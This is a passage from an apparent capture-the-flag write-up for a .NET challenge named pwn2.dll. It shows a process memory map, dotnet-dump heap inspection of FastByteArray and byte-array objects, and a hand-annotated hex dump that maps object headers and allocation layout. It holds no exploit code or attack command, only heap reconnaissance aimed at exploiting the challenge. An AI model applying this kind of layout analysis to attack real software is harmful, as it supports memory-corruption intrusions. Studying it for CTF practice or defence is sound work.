7f9b71ea1000-7f9b7388d000 r--p 00002000 08:01 3959906                    /usr/lib/x86_64-linux-gnu/libicudata.so.63.1
7f9b7388d000-7f9b7388e000 r--p 019ed000 08:01 3959906                    /usr/lib/x86_64-linux-gnu/libicudata.so.63.1
7f9b7388e000-7f9b7388f000 rw-p 019ee000 08:01 3959906                    /usr/lib/x86_64-linux-gnu/libicudata.so.63.1
7f9b7388f000-7f9b738f1000 r--p 00000000 08:01 3959916                    /usr/lib/x86_64-linux-gnu/libicuuc.so.63.1
7f9b738f1000-7f9b739c5000 r-xp 00062000 08:01 3959916                    /usr/lib/x86_64-linux-gnu/libicuuc.so.63.1
7f9b739c5000-7f9b73a49000 r--p 00136000 08:01 3959916                    /usr/lib/x86_64-linux-gnu/libicuuc.so.63.1
7f9b73a49000-7f9b73a5c000 r--p 001b9000 08:01 3959916                    /usr/lib/x86_64-linux-gnu/libicuuc.so.63.1
7f9b73a5c000-7f9b73a5d000 rw-p 001cc000 08:01 3959916                    /usr/lib/x86_64-linux-gnu/libicuuc.so.63.1
7f9b73a5d000-7f9b73a5e000 rw-p 00000000 00:00 0 
7f9b73a5e000-7f9b73a5f000 ---p 00000000 00:00 0 
7f9b73a5f000-7f9b73a62000 rw-p 00000000 00:00 0 
7f9b73a62000-7f9b73a6c000 r-xp 00000000 08:01 170618                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Globalization.Native.so
7f9b73a6c000-7f9b73c6b000 ---p 0000a000 08:01 170618                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Globalization.Native.so
7f9b73c6b000-7f9b73c6c000 r--p 00009000 08:01 170618                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Globalization.Native.so
7f9b73c6c000-7f9b73c6d000 rw-p 0000a000 08:01 170618                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Globalization.Native.so
7f9b73c6d000-7f9b73c7c000 r-xp 00000000 08:01 170643                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
7f9b73c7c000-7f9b73e7b000 ---p 0000f000 08:01 170643                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
7f9b73e7b000-7f9b73e7c000 r--p 0000e000 08:01 170643                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
7f9b73e7c000-7f9b73e7d000 rw-p 0000f000 08:01 170643                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
7f9b73e7d000-7f9b73e7f000 r--s 00000000 00:4d 19641305                   /day8/dist_test/bin/Release/netcoreapp3.0/pwn2.dll
7f9b73e7f000-7f9b74119000 r-xp 00000000 08:01 170754                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libclrjit.so
7f9b74119000-7f9b7411a000 ---p 0029a000 08:01 170754                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libclrjit.so
7f9b7411a000-7f9b7412c000 r--p 0029a000 08:01 170754                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libclrjit.so
7f9b7412c000-7f9b7412e000 rw-p 002ac000 08:01 170754                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libclrjit.so
7f9b7412e000-7f9b74153000 rw-p 00000000 00:00 0 
7f9b74153000-7f9b74154000 ---p 00000000 00:00 0 
7f9b74154000-7f9b74157000 rw-p 00000000 00:00 0 
7f9b74157000-7f9b74158000 ---p 00000000 00:00 0 
7f9b74158000-7f9b74198000 rw-p 00000000 00:00 0 
7f9b74198000-7f9b74199000 ---p 00000000 00:00 0 
7f9b74199000-7f9b7419c000 rw-p 00000000 00:00 0 
7f9b7419c000-7f9b7419d000 ---p 00000000 00:00 0 
7f9b7419d000-7f9b749ad000 rw-p 00000000 00:00 0 
7f9b749ad000-7f9b749ae000 ---p 00000000 00:00 0 
7f9b749ae000-7f9b749b1000 rw-p 00000000 00:00 0 
7f9b749b1000-7f9b749b2000 ---p 00000000 00:00 0 
7f9b749b2000-7f9b75351000 rw-p 00000000 00:00 0 
7f9b75351000-7f9b75651000 ---p 00000000 00:00 0 
7f9b75651000-7f9b75652000 ---p 00000000 00:00 0 
7f9b75652000-7f9b75655000 rw-p 00000000 00:00 0 
7f9b75655000-7f9b75656000 ---p 00000000 00:00 0 
7f9b75656000-7f9b75e56000 rw-p 00000000 00:00 0 
7f9b75e56000-7f9b75e57000 ---p 00000000 00:00 0 
7f9b75e57000-7f9b75e5a000 rw-p 00000000 00:00 0 
7f9b75e5a000-7f9b75e5b000 ---p 00000000 00:00 0 
7f9b75e5b000-7f9b7665b000 rw-p 00000000 00:00 0 
7f9b7665b000-7f9b76660000 ---p 00000000 00:00 0 
7f9b76660000-7f9b76662000 rw-p 00000000 00:00 0 
7f9b76662000-7f9b7667b000 ---p 00000000 00:00 0 
7f9b7667b000-7f9b7667c000 rw-p 00000000 00:00 0 
7f9b7667c000-7f9b7667d000 ---p 00000000 00:00 0 
7f9b7667d000-7f9b76e7d000 rw-p 00000000 00:00 0 
7f9b76e7d000-7f9b76e7f000 r--p 00000000 08:01 3959649                    /lib/x86_64-linux-gnu/librt-2.28.so
7f9b76e7f000-7f9b76e83000 r-xp 00002000 08:01 3959649                    /lib/x86_64-linux-gnu/librt-2.28.so
7f9b76e83000-7f9b76e85000 r--p 00006000 08:01 3959649                    /lib/x86_64-linux-gnu/librt-2.28.so
7f9b76e85000-7f9b76e86000 r--p 00007000 08:01 3959649                    /lib/x86_64-linux-gnu/librt-2.28.so
7f9b76e86000-7f9b76e87000 rw-p 00008000 08:01 3959649                    /lib/x86_64-linux-gnu/librt-2.28.so
7f9b76e87000-7f9b770d5000 r-xp 00000000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b770d5000-7f9b770d6000 rwxp 0024e000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b770d6000-7f9b773a3000 r-xp 0024f000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b773a3000-7f9b773a4000 rwxp 0051c000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b773a4000-7f9b77558000 r-xp 0051d000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b77558000-7f9b775a6000 r--p 006d0000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b775a6000-7f9b775b0000 rw-p 0071e000 08:01 170755                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
7f9b775b0000-7f9b775ef000 rw-p 00000000 00:00 0 
7f9b775ef000-7f9b7763d000 r-xp 00000000 08:01 170758                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libhostpolicy.so
7f9b7763d000-7f9b7783d000 ---p 0004e000 08:01 170758                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libhostpolicy.so
7f9b7783d000-7f9b7783e000 r--p 0004e000 08:01 170758                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libhostpolicy.so
7f9b7783e000-7f9b7783f000 rw-p 0004f000 08:01 170758                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libhostpolicy.so
7f9b7783f000-7f9b77898000 r-xp 00000000 08:01 169915                     /usr/share/dotnet/host/fxr/3.0.1/libhostfxr.so
7f9b77898000-7f9b77a98000 ---p 00059000 08:01 169915                     /usr/share/dotnet/host/fxr/3.0.1/libhostfxr.so
7f9b77a98000-7f9b77a99000 r--p 00059000 08:01 169915                     /usr/share/dotnet/host/fxr/3.0.1/libhostfxr.so
7f9b77a99000-7f9b77a9a000 rw-p 0005a000 08:01 169915                     /usr/share/dotnet/host/fxr/3.0.1/libhostfxr.so
7f9b77a9a000-7f9b77a9f000 rw-p 00000000 00:00 0 
7f9b77a9f000-7f9b77ac1000 r--p 00000000 08:01 3959586                    /lib/x86_64-linux-gnu/libc-2.28.so
7f9b77ac1000-7f9b77c09000 r-xp 00022000 08:01 3959586                    /lib/x86_64-linux-gnu/libc-2.28.so
7f9b77c09000-7f9b77c55000 r--p 0016a000 08:01 3959586                    /lib/x86_64-linux-gnu/libc-2.28.so
7f9b77c55000-7f9b77c56000 ---p 001b6000 08:01 3959586                    /lib/x86_64-linux-gnu/libc-2.28.so
7f9b77c56000-7f9b77c5a000 r--p 001b6000 08:01 3959586                    /lib/x86_64-linux-gnu/libc-2.28.so
7f9b77c5a000-7f9b77c5c000 rw-p 001ba000 08:01 3959586                    /lib/x86_64-linux-gnu/libc-2.28.so
7f9b77c5c000-7f9b77c60000 rw-p 00000000 00:00 0 
7f9b77c60000-7f9b77c63000 r--p 00000000 08:01 3959604                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f9b77c63000-7f9b77c74000 r-xp 00003000 08:01 3959604                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f9b77c74000-7f9b77c77000 r--p 00014000 08:01 3959604                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f9b77c77000-7f9b77c78000 ---p 00017000 08:01 3959604                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f9b77c78000-7f9b77c79000 r--p 00017000 08:01 3959604                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f9b77c79000-7f9b77c7a000 rw-p 00018000 08:01 3959604                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f9b77c7a000-7f9b77c87000 r--p 00000000 08:01 3959611                    /lib/x86_64-linux-gnu/libm-2.28.so
7f9b77c87000-7f9b77d26000 r-xp 0000d000 08:01 3959611                    /lib/x86_64-linux-gnu/libm-2.28.so
7f9b77d26000-7f9b77dfb000 r--p 000ac000 08:01 3959611                    /lib/x86_64-linux-gnu/libm-2.28.so
7f9b77dfb000-7f9b77dfc000 r--p 00180000 08:01 3959611                    /lib/x86_64-linux-gnu/libm-2.28.so
7f9b77dfc000-7f9b77dfd000 rw-p 00181000 08:01 3959611                    /lib/x86_64-linux-gnu/libm-2.28.so
7f9b77dfd000-7f9b77e86000 r--p 00000000 08:01 4745024                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
7f9b77e86000-7f9b77f32000 r-xp 00089000 08:01 4745024                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
7f9b77f32000-7f9b77f70000 r--p 00135000 08:01 4745024                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
7f9b77f70000-7f9b77f71000 ---p 00173000 08:01 4745024                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
7f9b77f71000-7f9b77f7b000 r--p 00173000 08:01 4745024                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
7f9b77f7b000-7f9b77f7d000 rw-p 0017d000 08:01 4745024                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
7f9b77f7d000-7f9b77f81000 rw-p 00000000 00:00 0 
7f9b77f81000-7f9b77f82000 r--p 00000000 08:01 3959596                    /lib/x86_64-linux-gnu/libdl-2.28.so
7f9b77f82000-7f9b77f83000 r-xp 00001000 08:01 3959596                    /lib/x86_64-linux-gnu/libdl-2.28.so
7f9b77f83000-7f9b77f84000 r--p 00002000 08:01 3959596                    /lib/x86_64-linux-gnu/libdl-2.28.so
7f9b77f84000-7f9b77f85000 r--p 00002000 08:01 3959596                    /lib/x86_64-linux-gnu/libdl-2.28.so
7f9b77f85000-7f9b77f86000 rw-p 00003000 08:01 3959596                    /lib/x86_64-linux-gnu/libdl-2.28.so
7f9b77f86000-7f9b77f8c000 r--p 00000000 08:01 3959645                    /lib/x86_64-linux-gnu/libpthread-2.28.so
7f9b77f8c000-7f9b77f9b000 r-xp 00006000 08:01 3959645                    /lib/x86_64-linux-gnu/libpthread-2.28.so
7f9b77f9b000-7f9b77fa1000 r--p 00015000 08:01 3959645                    /lib/x86_64-linux-gnu/libpthread-2.28.so
7f9b77fa1000-7f9b77fa2000 r--p 0001a000 08:01 3959645                    /lib/x86_64-linux-gnu/libpthread-2.28.so
7f9b77fa2000-7f9b77fa3000 rw-p 0001b000 08:01 3959645                    /lib/x86_64-linux-gnu/libpthread-2.28.so
7f9b77fa3000-7f9b77fa9000 rw-p 00000000 00:00 0 
7f9b77fa9000-7f9b77faa000 ---p 00000000 00:00 0 
7f9b77faa000-7f9b77fad000 rw-p 00000000 00:00 0 
7f9b77fad000-7f9b77fae000 r--p 00000000 08:01 3959572                    /lib/x86_64-linux-gnu/ld-2.28.so
7f9b77fae000-7f9b77fcc000 r-xp 00001000 08:01 3959572                    /lib/x86_64-linux-gnu/ld-2.28.so
7f9b77fcc000-7f9b77fd4000 r--p 0001f000 08:01 3959572                    /lib/x86_64-linux-gnu/ld-2.28.so
7f9b77fd4000-7f9b77fd5000 r--p 00026000 08:01 3959572                    /lib/x86_64-linux-gnu/ld-2.28.so
7f9b77fd5000-7f9b77fd6000 rw-p 00027000 08:01 3959572                    /lib/x86_64-linux-gnu/ld-2.28.so
7f9b77fd6000-7f9b77fd7000 rw-p 00000000 00:00 0 
7fff3cdd3000-7fff3cdf4000 rw-p 00000000 00:00 0                          [stack]
7fff3cdf6000-7fff3cdf8000 r--p 00000000 00:00 0                          [vvar]
7fff3cdf8000-7fff3cdfa000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

The next step is to analyze the heap memory we dumped. I found that the `dumpheap`, `dumpmt` (mt is MethodTable), and `dumpobj` were what we needed to explore what each memory object was.

In the output above, we have the memory addresses for our allocated objects, so we'll use `dumpheap` to find those:

```
root@7d0b1c83814a:/day8/dist_test# dotnet-dump analyze ./core_20191229_060948
Loading core dump: ./core_20191229_060948 ...
Ready to process analysis commands. Type 'help' to list available commands or 'help [command]' to get detailed help on a command.
Type 'quit' or 'exit' to exit the session.
> dumpheap
         Address               MT     Size
00007f9ad7fff000 0000000000a19c40       24 Free
00007f9ad7fff018 0000000000a19c40       24 Free
00007f9ad7fff030 0000000000a19c40       24 Free
00007f9ad7fff048 00007f9afdd43860      128     
00007f9ad7fff0c8 00007f9afdd43ae0      128     
00007f9ad7fff148 00007f9afdd43be0      128     
00007f9ad7fff1c8 00007f9afdd43ce0      128     
                                                               
<snip>

00007f9ad8008c60 00007f9afdf918c0       48     
00007f9ad8008c90 00007f9afde41330       32     
00007f9ad8008cb0 00007f9afde44248       24     
00007f9ad8008cc8 00007f9afdd421c8       40     
00007f9ad8008cf0 00007f9afdd414c0       25     
00007f9ad8008d10 00007f9afdd40f90       32     
00007f9ad8008d30 00007f9afdd40f90       34     
00007f9ad8008d58 00007f9afdd40f90       48     
00007f9ad8008d88 00007f9afdd414c0       25     
00007f9ad8008da8 00007f9afde412a0       24     
00007f9ad8008dc0 00007f9afdd414c0       56     
00007f9ad8008df8 00007f9afde4aba0       32     
00007f9ad8008e18 00007f9afde4aba0       32     
00007f9ad8008e38 00007f9afdd6d470      248     
00007f9ad8008f30 00007f9afdd35510      112     
00007f9ad8008fa0 00007f9afde4aba0       32     
00007f9ad8008fc0 00007f9afdd6d470      248     
00007f9ad80090b8 00007f9afdd6d470      248     
00007f9ad80091b0 00007f9afde44248       56     
00007f9ad80091e8 00007f9afdd414c0       25     
00007f9ad8009208 00007f9afdd414c0       25     
00007f9ad8009228 00007f9afde412a0       24     
00007f9ad8009240 00007f9afdd414c0       55     
00007f9ad8009278 00007f9afdd414c0       25     
00007f9ad8009298 00007f9afdd414c0       25     
00007f9ad80092b8 00007f9afde412a0       24     
00007f9ad80092d0 00007f9afdd414c0       54     
00007f9ad8009308 00007f9afdd414c0       25     
00007f9ad8009328 00007f9afdd414c0       25     
00007f9ad8009348 00007f9afde412a0       24     
00007f9ad8009360 00007f9afdd414c0       53     
00007f9ad8009398 00007f9afdd414c0       25     
00007f9ad80093b8 00007f9afdd414c0       25     
00007f9ad80093d8 00007f9afde412a0       24     
00007f9ad80093f0 00007f9afdd414c0       52     
00007f9ad8009428 00007f9afde44248       88     
00007f9ad8009480 00007f9afdd414c0       25     
00007f9ad80094a0 00007f9afdd414c0       25     
00007f9ad80094c0 00007f9afde412a0       24     
00007f9ad80094d8 00007f9afdd414c0       51     
00007f9ad8009510 00007f9afdd414c0       25     
00007f9ad8009530 00007f9afdd40f90       78     
00007f9ad8009580 00007f9afdd38348       24     
00007f9ad8009598 00007f9afdd3b468       24     
00007f9ad80095b0 00007f9afd2bc798       24     
00007f9ad80095c8 00007f9afdf94140       24     
00007f9ad80095e0 00007f9afdf93f08       64     

<snip>
```

At first this isn't quite helpful until we get the description of a couple of types:

```
> dumpobj 00007f9ad8008cb0
Name:        FastByteArray[]
MethodTable: 00007f9afde44248
EEClass:     00007f9afdd35488
Size:        24(0x18) bytes
Array:       Rank 1, Number of elements 0, Type CLASS
Fields:
None
> dumpmt 00007f9afde44248
EEClass:         00007F9AFDD35488
Module:          00007F9AFDD6DB78
Name:            FastByteArray[]
mdToken:         0000000002000000
File:            /day8/dist_test/bin/Release/netcoreapp3.0/pwn2.dll
BaseSize:        0x18
ComponentSize:   0x8
Slots in VTable: 28
Number of IFaces in IFaceMap: 6
> dumpobj 00007f9ad8008da8                                                                                                                                                                                                                   
Name:        FastByteArray
MethodTable: 00007f9afde412a0
EEClass:     00007f9afdee2a00
Size:        24(0x18) bytes
File:        /day8/dist_test/bin/Release/netcoreapp3.0/pwn2.dll
Fields:
              MT    Field   Offset                 Type VT     Attr            Value Name
00007f9afdd414c0  4000001        8        System.Byte[]  0 instance 00007f9ad8008dc0 bytes
00007f9afde4aba0  4000002        8        System.Random  0   static 00007f9ad8008df8 random
> dumpmt 00007f9afde412a0                                                                                                                                                                                                                    
EEClass:         00007F9AFDEE2A00
Module:          00007F9AFDD6DB78
Name:            FastByteArray
mdToken:         0000000002000003
File:            /day8/dist_test/bin/Release/netcoreapp3.0/pwn2.dll
BaseSize:        0x18
ComponentSize:   0x0
Slots in VTable: 9
Number of IFaces in IFaceMap: 0
> dumpobj 00007f9ad8008dc0                                                                                                                                                                                                                   
Name:        System.Byte[]
MethodTable: 00007f9afdd414c0
EEClass:     00007f9afdd41450
Size:        56(0x38) bytes
Array:       Rank 1, Number of elements 32, Type Byte
Content:     ............4..j....E.5..2..nK.'
Fields:
None
> dumpmt 00007f9afdd414c0                                                                                                                                                                                                                    
EEClass:         00007F9AFDD41450
Module:          00007F9AFD2B4020
Name:            System.Byte[]
mdToken:         0000000002000000
File:            /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Private.CoreLib.dll
BaseSize:        0x18
ComponentSize:   0x1
Slots in VTable: 28
Number of IFaces in IFaceMap: 6
```

.. and so on. At this point, I re-labeled the heap structures with their types:

```
00007f9ad8008c60 00007f9afdf918c0       48     
00007f9ad8008c90 00007f9afde41330       32     
00007f9ad8008cb0 00007f9afde44248       24     FastByteArray[]
00007f9ad8008cc8 00007f9afdd421c8       40     System.SByte[]
00007f9ad8008cf0 00007f9afdd414c0       25     System.Byte[]
00007f9ad8008d10 00007f9afdd40f90       32     System.String
00007f9ad8008d30 00007f9afdd40f90       34     System.String
00007f9ad8008d58 00007f9afdd40f90       48     System.String
00007f9ad8008d88 00007f9afdd414c0       25     System.Byte[]
00007f9ad8008da8 00007f9afde412a0       24     FastByteArray
00007f9ad8008dc0 00007f9afdd414c0       56     System.Byte[]	***
00007f9ad8008df8 00007f9afde4aba0       32     System.Random
00007f9ad8008e18 00007f9afde4aba0       32     System.Random
00007f9ad8008e38 00007f9afdd6d470      248     System.Int32[]
00007f9ad8008f30 00007f9afdd35510      112     System.Object[]
00007f9ad8008fa0 00007f9afde4aba0       32     System.Random
00007f9ad8008fc0 00007f9afdd6d470      248     System.Int32[]
00007f9ad80090b8 00007f9afdd6d470      248     System.Int32[]
00007f9ad80091b0 00007f9afde44248       56     FastByteArray[]
00007f9ad80091e8 00007f9afdd414c0       25     System.Byte[]
00007f9ad8009208 00007f9afdd414c0       25     System.Byte[]
00007f9ad8009228 00007f9afde412a0       24     FastByteArray
00007f9ad8009240 00007f9afdd414c0       55     System.Byte[]	***
00007f9ad8009278 00007f9afdd414c0       25     System.Byte[]
00007f9ad8009298 00007f9afdd414c0       25     System.Byte[]
00007f9ad80092b8 00007f9afde412a0       24     FastByteArray
00007f9ad80092d0 00007f9afdd414c0       54     System.Byte[]	***
00007f9ad8009308 00007f9afdd414c0       25     System.Byte[]
00007f9ad8009328 00007f9afdd414c0       25     System.Byte[]
00007f9ad8009348 00007f9afde412a0       24     FastByteArray
00007f9ad8009360 00007f9afdd414c0       53     System.Byte[]	***
00007f9ad8009398 00007f9afdd414c0       25     System.Byte[]
00007f9ad80093b8 00007f9afdd414c0       25     System.Byte[]
00007f9ad80093d8 00007f9afde412a0       24     FastByteArray
00007f9ad80093f0 00007f9afdd414c0       52     System.Byte[]	***
00007f9ad8009428 00007f9afde44248       88     FastByteArray[]
00007f9ad8009480 00007f9afdd414c0       25     System.Byte[]
00007f9ad80094a0 00007f9afdd414c0       25     System.Byte[]
00007f9ad80094c0 00007f9afde412a0       24     FastByteArray
00007f9ad80094d8 00007f9afdd414c0       51     System.Byte[]	***
00007f9ad8009510 00007f9afdd414c0       25     System.Byte[]
00007f9ad8009530 00007f9afdd40f90       78     System.String
00007f9ad8009580 00007f9afdd38348       24     System.Byte
00007f9ad8009598 00007f9afdd3b468       24     System.Int64
00007f9ad80095b0 00007f9afd2bc798       24     
00007f9ad80095c8 00007f9afdf94140       24     
00007f9ad80095e0 00007f9afdf93f08       64     
```

To me, it looks like the program creates a `FastByteArray[]` object with a bunch of sub elements, and when the size of the array grows larger than the allocated entries, it will allocate a new one and wait for the first to be garbage collected. Furthermore, as can be seen in the memory dump way above, the 2nd to 5th allocations are all in consecutive memory which helps organize things a bit. With this information, I can carefully stitch together the memory dump we got from the program and label it:

```
Starting at address 7f9ad8008dd0:
7f9ad8008dd0: a8da 82ef d304 c583 d394 89f3 34e0 de6a  ............4..j
7f9ad8008de0: a3c8 9e08 45c3 3592 bd32 feec 6e4b 9d27  ....E.5..2..nK.'
7f9ad8008df0: 0000 0000 0000 0000 a0ab e4fd 9a7f 0000  ................
7f9ad8008e00: b890 00d8 9a7f 0000 0c00 0000 2100 0000  ............!...
7f9ad8008e10: 0000 0000 0000 0000 a0ab e4fd 9a7f 0000  ................
7f9ad8008e20: 388e 00d8 9a7f 0000 0100 0000 1600 0000  8...............
7f9ad8008e30: 0000 0000 0000 0000 70d4 d6fd 9a7f 0000  ........p.......
7f9ad8008e40: 3800 0000 0000 0000 0000 0000 454f 411d  8...........EOA.
7f9ad8008e50: ae91 cc64 a593 131b b989 2671 9971 b34b  ...d......&q.q.K
7f9ad8008e60: 2b7d 311d 9a7d c139 f2f1 275f 9ebc a871  +}1..}.9..'_...q
7f9ad8008e70: c4db ce25 e980 f74e faa1 fe5d 1e7f 9d47  ...%...N...]...G
7f9ad8008e80: da2a 535a 2bf0 6946 17c9 d137 2101 ff38  .*SZ+.iF...7!..8
7f9ad8008e90: 7300 c94f e97c cb5a 171b 7b62 75e9 6b51  s..O.|.Z..{bu.kQ
7f9ad8008ea0: f96e 5368 432b d62f c7bd 046c 477d bf46  .nShC+./...lG}.F
7f9ad8008eb0: 69a7 7422 2779 9454 de9b f975 cd3c 1e0b  i.t"'y.T...u.<..
(break)
Starting at address 7f9ad8009250:
7f9ad8009250: 31d4 9b36 f894 47dd c41a 145a 2ff9 3c16  1..6..G....Z/.<.		System.Byte[] contents (2nd allocation)
7f9ad8009260: 844e a788 abc8 13e5 a4f0 31a1 06d9 1400  .N........1.....
7f9ad8009270: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad8009280: 0100 0000 0000 0000 0100 0000 0000 0000  ................		length = 1, value = 1 (for the Reader.ReadByte() -> '\x01' in my "Add" call)
7f9ad8009290: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad80092a0: 0100 0000 0000 0000 1e00 0000 0000 0000  ................		length = 1, value = 1e (for the Reader.ReadByte() -> '\x1e' in my "Add" call)
7f9ad80092b0: 0000 0000 0000 0000 a012 e4fd 9a7f 0000  ................		[00007f9afde412a0 == MT for FastByteArray]
7f9ad80092c0: d092 00d8 9a7f 0000 0000 0000 0000 0000  ................		pointer to System.Byte[] object below
7f9ad80092d0: c014 d4fd 9a7f 0000 1e00 0000 0000 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]], length = 1e
7f9ad80092e0: 88f6 62c1 5f45 a872 0f81 c044 2bae db62  ..b._E.r...D+..b		System.Byte[] contents (3rd allocation)
7f9ad80092f0: c3f5 e867 20a4 157b 68c0 b591 0862 0000  ...g ..{h....b..		
7f9ad8009300: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad8009310: 0100 0000 0000 0000 0100 0000 0000 0000  ................		length = 1, value = 1 (for the Reader.ReadByte() -> '\x01' in my "Add" call)
7f9ad8009320: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad8009330: 0100 0000 0000 0000 1d00 0000 0000 0000  ................		length = 1, value = 1d (for the Reader.ReadByte() -> '\x1d' in my "Add" call)
7f9ad8009340: 0000 0000 0000 0000 a012 e4fd 9a7f 0000  ................		[00007f9afde412a0 == MT for FastByteArray]
7f9ad8009350: 6093 00d8 9a7f 0000 0000 0000 0000 0000  `...............		pointer to System.Byte[] object below
7f9ad8009360: c014 d4fd 9a7f 0000 1d00 0000 0000 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]], length = 1d
7f9ad8009370: a6d7 ea05 8c64 cd38 ddd1 dcdc 9707 eb84  .....d.8........		System.Byte[] contents (4th allocation)
7f9ad8009380: e836 c88d 6dab 1d71 f3e3 e0e6 5800 0000  .6..m..q....X...		
7f9ad8009390: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad80093a0: 0100 0000 0000 0000 0100 0000 0000 0000  ................		length = 1, value = 1 (for the Reader.ReadByte() -> '\x01' in my "Add" call)
7f9ad80093b0: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad80093c0: 0100 0000 0000 0000 1c00 0000 0000 0000  ................		length = 1, value = 1c (for the Reader.ReadByte() -> '\x1c' in my "Add" call)
7f9ad80093d0: 0000 0000 0000 0000 a012 e4fd 9a7f 0000  ................		[00007f9afde412a0 == MT for FastByteArray]
7f9ad80093e0: f093 00d8 9a7f 0000 0000 0000 0000 0000  ................		pointer to System.Byte[] object below
7f9ad80093f0: c014 d4fd 9a7f 0000 1c00 0000 0000 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]], length = 1c
7f9ad8009400: 9e8f 1669 acdb e859 2522 7695 8b18 178b  ...i...Y%"v.....		System.Byte[] contents (5th allocation)
7f9ad8009410: 440c 0e90 e4d8 7fc8 7af4 faba 0000 0000  D.......z.......		
7f9ad8009420: 0000 0000 0000 0000 4842 e4fd 9a7f 0000  ........HB......		[00007f9afde44248 == MT for FastByteArray[]]
7f9ad8009430: 0800 0000 0000 0000 a88d 00d8 9a7f 0000  ................		pointer to FastByteArray object
7f9ad8009440: 2892 00d8 9a7f 0000 b892 00d8 9a7f 0000  (...............		pointer to FastByteArray object, pointer to FastByteArray object
7f9ad8009450: 4893 00d8 9a7f 0000 d893 00d8 9a7f 0000  H...............		pointer to FastByteArray object, pointer to FastByteArray object
7f9ad8009460: c094 00d8 9a7f 0000 0000 0000 0000 0000  ................		pointer to FastByteArray object
7f9ad8009470: 0000 0000 0000 0000 0000 0000 0000 0000  ................		
7f9ad8009480: c014 d4fd 9a7f 0000 0100 0000 0000 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]], length = 1
7f9ad8009490: 0100 0000 0000 0000 0000 0000 0000 0000  ................		value = 1 (for the Reader.ReadByte() -> '\x01' in my "Add" call)
7f9ad80094a0: c014 d4fd 9a7f 0000 0100 0000 0000 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]], length = 1
7f9ad80094b0: 1b00 0000 0000 0000 0000 0000 0000 0000  ................		value = 1b (for the Reader.ReadByte() -> '\x1b' in my "Add" call)
7f9ad80094c0: a012 e4fd 9a7f 0000 d894 00d8 9a7f 0000  ................		[00007f9afde412a0 == MT for FastByteArray]
7f9ad80094d0: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................		[00007f9afdd414c0 == MT for System.Byte[]]
7f9ad80094e0: 1b00 0000 0000 0000                                      		length = 1b
(off-cut by 8 here)
7f9ad80094e8: 7912 a883 e6df 3e41 c572 ea2c 032a c214  y.....>A.r.,.*..		System.Byte[] contents (6th allocation)
7f9ad80094f8: 52f8 e192 06e6 aed7 d256 7300 0000 0000  R........Vs.....
7f9ad8009508: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
7f9ad8009518: 0100 0000 0000 0000 0000 0000 0000 0000  ................
7f9ad8009528: 0000 0000 0000 0000 900f d4fd 9a7f 0000  ................
7f9ad8009538: 1c00 0000 6100 7200 7200 6100 7900 7300  ....a.r.r.a.y.s.
7f9ad8009548: 5b00 7b00 3000 3a00 6400 7d00 5d00 2e00  [.{.0.:.d.}.]...
7f9ad8009558: 6200 7900 7400 6500 7300 2000 3d00 2000  b.y.t.e.s. .=. .
